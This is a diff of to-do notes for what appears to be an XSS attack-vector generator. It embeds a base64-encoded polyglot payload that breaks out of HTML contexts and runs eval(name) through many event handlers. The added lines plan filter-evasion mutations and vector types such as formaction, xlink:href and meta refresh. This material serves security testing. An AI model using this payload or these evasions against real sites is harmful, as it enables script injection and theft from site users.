@@ -12,6 +12,16 @@ html generation:
     == atob("amF2YXNjcmlwdDovKi0tPl1dPiU+Pz48L3NjcmlwdD48L3RpdGxlPjwvdGV4dGFyZWE+PC9ub3NjcmlwdD48L3N0eWxlPjwveG1wPiI+W2ltZz0xLG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpXTxpbWcgLS9zdHlsZT1hOmV4cHJlc3Npb24mIzQwJiM0NyYjNDInLy0vKiYjMzksLyoqL2V2YWwobmFtZSkvKiUyQS8vLyovLy8mIzQxOzt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO3Bvc2l0aW9uOmFic29sdXRlOy1tcy1iZWhhdmlvcjp1cmwoI2RlZmF1bHQjdGltZTIpIG5hbWU9dG9wLnBvc3RNZXNzYWdlKFt3aW5kb3cubG9jYXRpb24uaHJlZix3aW5kb3cubmFtZV0sL1wqLy5zb3VyY2Uuc2xpY2UoMSkpIG9uZXJyb3I9ZXZhbChuYW1lKSBzcmM9MSBhdXRvZm9jdXMgb25mb2N1cz1ldmFsKG5hbWUpIG9uY2xpY2s9ZXZhbChuYW1lKSBvbm1vdXNlb3Zlcj1ldmFsKG5hbWUpIG9uYmVnaW49ZXZhbChuYW1lKSBiYWNrZ3JvdW5kPWphdmFzY3JpcHQ6ZXZhbChuYW1lKS8vPiI=");
 * see http://htmlpurifier.org/live/smoketests/xssAttacks.php
 
-* entities, ...,
+* mutation
+** entities, and named entities for slash, parenthesis, tab, newline, ..         &sol; &Tab; &NewLine;
+** do \x encoding in JS if char < FF. otherwise retain \u
+** capitalization
+** random crap before tag closing
 * make template.php interchangable with data URIs as iframe src
-* add jar-protocol
+** generating attack vectors
+** add jar-protocol
+** formaction
+** xlink:href
+** form&action=xss
+** isindex
+** meta refresh
